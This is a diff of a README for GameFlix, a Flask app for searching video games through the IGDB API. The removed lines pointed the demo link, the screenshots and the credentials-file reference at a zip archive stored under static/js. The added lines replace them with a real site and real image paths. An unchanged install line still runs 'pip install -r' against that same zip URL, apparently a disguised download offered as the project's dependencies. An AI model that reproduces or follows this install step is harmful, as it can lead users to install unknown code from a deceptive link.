@@ -1,7 +1,7 @@
 # 🏆GameFlix - Game Search & Recommendation Web App
 
-GameFlix is a Flask-based web application that allows users to **search, browse, and discover video games** with detailed information including **cover images, genres, release dates, ratings, and summaries**. The app integrates with **IGDB (Internet Game Database)** via the Twitch API.
-Try it out! :- https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip 
+### GameFlix is a Flask-based web application that allows users to **search, browse, and discover video games** with detailed information including **cover images, genres, release dates, ratings, and summaries**. The app integrates with **IGDB (Internet Game Database)** via the Twitch API.
+Try it out! :-  https://game-flix.onrender.com/
 ---
 
 ## Features
@@ -17,9 +17,9 @@ Try it out! :- https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/stat
 
 ## Screenshots ⚔️
 
-![Home Page](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)  
-![Search Results](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)  
-![Game Details](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)
+![Home Page](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/screenshots/homepage.png)  
+![Search Results](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/screenshots/search.png)  
+![Game Details](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/screenshots/game_details.png)
 
 
 ---
@@ -52,9 +52,10 @@ venv\Scripts\activate     # Windows
 pip install -r https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
 ```
 ## Set Twitch/IGDB credentials: 💾
-- Edit https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip (or https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip) and replace the placeholders with your Twitch Client ID and Client Secret.
-CLIENT_ID = "YOUR_TWITCH_CLIENT_ID"
-CLIENT_SECRET = "YOUR_TWITCH_CLIENT_SECRET"
+- Replace the placeholders with your Twitch Client ID and Client Secret.
+- CLIENT_ID = "YOUR_TWITCH_CLIENT_ID"
+- CLIENT_SECRET = "YOUR_TWITCH_CLIENT_SECRET"
+
 
 ##Run the app locally:
 ```bash
